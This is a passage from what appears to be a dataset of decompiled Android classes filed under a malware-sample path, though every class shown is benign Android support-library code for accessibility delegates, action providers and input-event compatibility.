MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(1);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,1);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat listener){       return null;     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return false;     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return true;     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return false;     }   } static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }       } );     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);     }   } static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }         @Override public Object getAccessibilityNodeProvider(        View host){           AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);           if (provider != null) {             return provider.getProvider();           }           return null;         }         @Override public boolean performAccessibilityAction(        View host,        int action,        Bundle args){           return compat.performAccessibilityAction(host,action,args);         }       } );     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);       if (provider != null) {         return new AccessibilityNodeProviderCompat(provider);       }       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public Object getBridge(){     return this.mBridge;   }   public void sendAccessibilityEvent(  View host,  int eventType){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,host,eventType);   }   public void sendAccessibilityEventUnchecked(  View host,  AccessibilityEvent event){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,host,event);   }   public boolean dispatchPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,host,info);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,host,child,event);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View host){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,host);   }   public boolean performAccessibilityAction(  View host,  int action,  Bundle args){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,host,action,args);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(host,event);       }     } ;   }   public static boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).dispatchPopulateAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  Object info){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityNodeInfo(host,(AccessibilityNodeInfo)info);   }   public static void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onPopulateAccessibilityEvent(host,event);   }   public static boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).onRequestSendAccessibilityEvent(host,child,event);   }   public static void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEvent(host,eventType);   }   public static void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEventUnchecked(host,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(host,event);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View host){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(host);       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(host,action,args);       }     } ;   }   public static Object getAccessibilityNodeProvider(  Object delegate,  View host){     return ((View.AccessibilityDelegate)delegate).getAccessibilityNodeProvider(host);   }   public static boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return ((View.AccessibilityDelegate)delegate).performAccessibilityAction(host,action,args);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateIcsImpl.code","static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }     } );   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateJellyBeanImpl.code","static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }       @Override public Object getAccessibilityNodeProvider(      View host){         AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);         if (provider != null) {           return provider.getProvider();         }         return null;       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return compat.performAccessibilityAction(host,action,args);       }     } );   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);     if (provider != null) {       return new AccessibilityNodeProviderCompat(provider);     }     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\AccessibilityDelegateStubImpl.code","static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat listener){     return null;   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return false;   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return true;   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ActionProvider.code","public abstract class ActionProvider {   private static final String TAG=""ActionProvider(support)"";   private final Context mContext;   private SubUiVisibilityListener mSubUiVisibilityListener;   private VisibilityListener mVisibilityListener; public interface SubUiVisibilityListener {     void onSubUiVisibilityChanged(    boolean z);   } public interface VisibilityListener {     void onActionProviderVisibilityChanged(    boolean z);   }   public abstract View onCreateActionView();   public ActionProvider(  Context context){     this.mContext=context;   }   public Context getContext(){     return this.mContext;   }   public View onCreateActionView(  MenuItem forItem){     return onCreateActionView();   }   public boolean overridesItemVisibility(){     return false;   }   public boolean isVisible(){     return true;   }   public void refreshVisibility(){     if (this.mVisibilityListener != null && overridesItemVisibility()) {       this.mVisibilityListener.onActionProviderVisibilityChanged(isVisible());     }   }   public boolean onPerformDefaultAction(){     return false;   }   public boolean hasSubMenu(){     return false;   }   public void onPrepareSubMenu(  SubMenu subMenu){   }   public void subUiVisibilityChanged(  boolean isVisible){     if (this.mSubUiVisibilityListener != null) {       this.mSubUiVisibilityListener.onSubUiVisibilityChanged(isVisible);     }   }   public void setSubUiVisibilityListener(  SubUiVisibilityListener listener){     this.mSubUiVisibilityListener=listener;   }   public void setVisibilityListener(  VisibilityListener listener){     if (this.mVisibilityListener != null && listener != null) {       Log.w(TAG,""setVisibilityListener: Setting a new ActionProvider.VisibilityListener when one is already set. Are you reusing this "" + getClass().getSimpleName() + "" instance while it is still in use somewhere else?"");     }     this.mVisibilityListener=listener;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseKeyEventVersionImpl.code","static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int metaState,  int modifiers,  int basic,  int left,  int right){     boolean wantBasic=(modifiers & basic) != 0;     int directional=left | right;     boolean wantLeftOrRight=(modifiers & directional) != 0;     if (wantBasic) {       if (wantLeftOrRight) {         throw new IllegalArgumentException(""bad arguments"");       }       return metaState & (directional ^ (-1));     }     if (wantLeftOrRight) {       return metaState & (basic ^ (-1));     }     return metaState;   }   @Override public int normalizeMetaState(  int metaState){     if ((metaState & 192) != 0) {       metaState|=1;     }     if ((metaState & 48) != 0) {       metaState|=2;     }     return metaState & 247;   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return (normalizeMetaState(metaState) & 247) == 0;   }   @Override public void startTracking(  KeyEvent event){   }   @Override public boolean isTracking(  KeyEvent event){     return false;   }   @Override public Object getKeyDispatcherState(  View view){     return null;   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseMenuVersionImpl.code","static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return item;   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return item;   }   @Override public View getActionView(  MenuItem item){     return null;   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\BaseMotionEventVersionImpl.code","static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return pointerId == 0 ? 0 : -1;   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public int getPointerCount(  MotionEvent event){     return 1;   } } "
